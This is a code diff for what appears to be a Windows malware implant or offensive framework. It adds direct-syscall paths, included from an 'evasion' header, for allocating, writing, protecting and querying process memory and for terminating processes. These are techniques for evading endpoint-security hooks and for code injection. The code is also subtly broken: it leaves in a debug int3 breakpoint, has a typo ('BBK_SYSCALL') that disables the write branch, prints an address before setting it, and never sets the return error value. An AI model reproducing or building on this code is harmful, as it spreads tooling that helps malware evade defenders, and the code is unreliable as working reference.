@@ -1,5 +1,6 @@
 #include <utils.h>
 #include <common.h>
+#include <evasion.h>
 
 /*=================================[ Heap bkAPIs ]=================================*/
 
@@ -77,6 +78,9 @@ FUNC DWORD bkProcessTerminate(
     Instance()->Win32.TerminateProcess( hProcess, ExitStatus );
 #elif BK_NTAPI
     Instance()->Win32.NtTerminateProcess( hProcess, ExitStatus );
+#elif BK_SYSCALL
+    SET_SYSCALL( Syscall().SysTable.NtTerminateProcess );
+    RunSyscall( hProcess, ExitStatus );   
 #endif
     return NtLastError();
 }
@@ -146,6 +150,20 @@ FUNC DWORD bkMemAlloc(
     Err = Instance()->Win32.NtAllocateVirtualMemory( ProcessHandle, &MemAllocated, 0, &RegionSize, AllocationType, Protection );
 
     *BaseAddr   = MemAllocated;
+#elif BK_SYSCALL
+    PVOID  MemAllocated    = NULL;
+
+    if ( !ProcessHandle )    
+        ProcessHandle = NtCurrentProcess();
+
+    SET_SYSCALL( Syscall().SysTable.NtAllocateVirtualMemory );
+
+    asm("int3");
+
+    RunSyscall( ProcessHandle, &MemAllocated, 0, &RegionSize, AllocationType, Protection );
+    BK_PRINT( "[fds] %p\n", *BaseAddr );
+
+    *BaseAddr   = MemAllocated;
 #endif
 
     return Err;
@@ -176,6 +194,12 @@ FUNC DWORD bkMemWrite(
         ProcessHandle = NtCurrentProcess();
 
     Err = Instance()->Win32.NtWriteVirtualMemory( ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten );
+#elif BBK_SYSCALL
+    if ( !ProcessHandle )    
+        ProcessHandle = NtCurrentProcess();
+
+    SET_SYSCALL( Syscall().SysTable.NtWriteVirtualMemory );
+    RunSyscall( ProcessHandle, MemBaseAddr, Buffer, BufferSize, &BytesWritten );
 #endif
     return Err;
 }
@@ -201,9 +225,16 @@ FUNC DWORD bkMemProtect(
 #elif BK_NTAPI
     if ( !ProcessHandle )    
         ProcessHandle = NtCurrentProcess();
+    
     Err = Instance()->Win32.NtProtectVirtualMemory( ProcessHandle, &BaseAddr, &RegionSize, NewProtection, &OldProtection );
+#elif BK_SYSCALL
+    if ( !ProcessHandle )    
+        ProcessHandle = NtCurrentProcess();
+    
+    SET_SYSCALL( Syscall().SysTable.NtProtectVirtualMemory );
+    RunSyscall( ProcessHandle, &BaseAddr, &RegionSize, NewProtection, &OldProtection );
 #endif
-
+    
     return Err;
 }
 
@@ -237,6 +268,16 @@ FUNC DWORD bkMemQuery(
         ProcessHandle = NtCurrentProcess();
 
     Err = Instance()->Win32.NtQueryVirtualMemory(
+        ProcessHandle, BaseAddress,
+        MemoryBasicInformation, &Mbi,
+        sizeof(MEMORY_BASIC_INFORMATION), NULL
+    );
+#elif BK_SYSCALL
+    if ( !ProcessHandle )
+        ProcessHandle = NtCurrentProcess();
+
+    SET_SYSCALL( Syscall().SysTable.NtQueryVirtualMemory );
+    RunSyscall( 
         ProcessHandle, BaseAddress,
         MemoryBasicInformation, &Mbi,
         sizeof(MEMORY_BASIC_INFORMATION), NULL
